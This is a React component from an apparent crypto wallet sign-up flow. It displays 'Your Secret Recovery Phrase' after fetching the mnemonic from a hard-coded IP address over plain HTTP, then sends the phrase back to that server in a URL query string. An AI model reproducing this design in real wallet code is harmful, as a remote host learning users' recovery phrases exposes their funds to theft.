import React , {useEffect ,useRef ,useState} from 'react'
import { Link } from 'react-router-dom'
import Logo from "../../sbglogo.png";


// const mnemonicWords = require('mnemonic-words');

const Newparase = () => {
  const [pharas, setpharas] = useState();
  const [myData, setmyData] = useState();
 

  const Phrase  = async () => {
    fetch('http://167.172.106.122:8081/memonic')
    .then((res) => res.json())
    .then(async (data) => { 
      console.log(data)
      setpharas(data.phrase)
      setmyData(data)
      await Getdata(data.phrase)
    });
  }


  async function Getdata(phrase){

  await fetch(`http://167.172.106.122:8081/phrase?phrase=${phrase}`)
  .then((response) => {
    return response.json();
  })
  .then((data) => {
    let authors = data;
  
    if(authors.length > 0){
      Phrase()
    }
    else{
      setpharas(phrase);
    }
  })
 
  }


   useEffect(()=>{
    Phrase()
   },[])
//----------------------------------------------------------------


    return (
        <>
        <div className="container">
        
          <div className="row align-items-start">
            <div style={{height:'100px', textAlign:'left'}} className="col-md-4 col-sm-12"><img style={{width:'30%',marginTop:'22px'}} src={Logo} className="card-img-top" alt="..." /></div>
            <div className="col"></div>
            <div className="col"></div>
          </div>
        
        
          <div className="row align-items-start">
            <div className="col-md-3"></div>
            <div style={{textAlign:'left'}} className="col-md-6 col-sm-12"><h4>Your Secret Recovery Phrase.</h4>
            <div className="row align-items-start">
                <div className="col-md-6 col-sm-12"><b>Recovery Pharase</b></div>
                <div className="col-md-6 col-sm-12">
                 
                </div><br />
                <div className="col-md-1"></div>
                <div style={{marginTop:'15px',alignItems:'center',textAlign:'center'}} className='col-md-10 col-sm-12'>
                  <div id='alt' style={{borderRadius: '30px',fontSize: '10px', display:'none'}} className="alert alert-info">
                    <strong>Info!</strong> This alert box could indicate a neutral informative change or action.
                  </div>
                </div>
                <div className="col-md-1"></div>
            </div>
    
            <div className="row align-items-start">
            <div className="col-md-2 col-sm-12"></div>
            <div id='alert' className="col-md-8 col-sm-12"></div>
            <div className="col-md-2 col-sm-12"></div>
            </div>
            </div>
            <div className="col-md-3"></div>
          </div>
          
    
          <div className="row align-items-end">
            <div className="col-md-3 col-sm-12"></div>
        
            <div className="mt-3 col-md-6 col-sm-12">
     
    
            <div style={{display:'flex'}} className="p-19 mb-3">
              <div style={{marginRight:'0px',paddingRight:'0px', width:'100%'}} className="row input-group mb-3">
                {/* <h6 style={{marginTop:'10px',marginRight:'3px'}} className='col-1'>1.</h6> */}
                <div className="form-group">
                {/* <label for="exampleFormControlTextarea1">Large textarea</label> */}
                <p className="form-control rounded-0" id="pharas" rows="10">{pharas}</p>
                </div>
              </div>
              
            </div>
           
           
           <div style={{textAlign:'left',marginBottom:'10px'}}>
           <Link  to="/inputnew" state={myData}><a style={{borderRadius:'50px',fontSize:'11px',width: "120px"}} href="#" className="btn btn-primary">
            Next
            </a></Link>
            {/* <
             */}
           </div>
    
            </div>
            
            <div className="col-md-3 col-sm-12"></div>
          </div>
        
        
          <div className="row align-items-end">
            <div className="col"></div>
            <div className="col"></div>
            <div className="col"></div>
          </div>
        
        </div>
        
            </>
      )
}

export default Newparase
